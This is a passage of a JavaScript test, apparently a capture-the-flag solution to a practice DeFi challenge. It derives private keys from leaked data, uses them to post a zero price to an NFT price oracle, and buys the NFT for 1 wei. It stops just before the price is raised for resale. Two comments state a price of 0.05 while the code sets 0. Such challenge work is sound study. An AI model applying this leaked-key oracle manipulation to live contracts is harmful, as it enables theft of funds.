...
describe('Compromised challenge', function () {
    ...
    it('Execution', async function () {
        ...
        // Check that private keys belong to oracle sources
        const wallet1 = new ethers.Wallet(leakToPrivateKey(leakedInformation[0]), ethers.provider);
        const wallet2 = new ethers.Wallet(leakToPrivateKey(leakedInformation[1]), ethers.provider);
        console.log("Address 1: ", wallet1.address);
        console.log("Address 2: ", wallet2.address);
        expect(sources).to.include(wallet1.address);
        expect(sources).to.include(wallet2.address);

        // Change the price of the NFT to 0.05
        await oracle.connect(wallet1).postPrice('DVNFT', 0);
        await oracle.connect(wallet2).postPrice('DVNFT', 0);

        // Check that the price of the NFT is 0.05
        expect(await oracle.getMedianPrice('DVNFT')).to.eq(0);

        // Buy the NFT
        await exchange.connect(player).buyOne({ value: 1 });

        // Check that the player owns the NFT
        expect(await nftToken.ownerOf(0)).to.eq(player.address);

        // Change the price of the NFT to 999
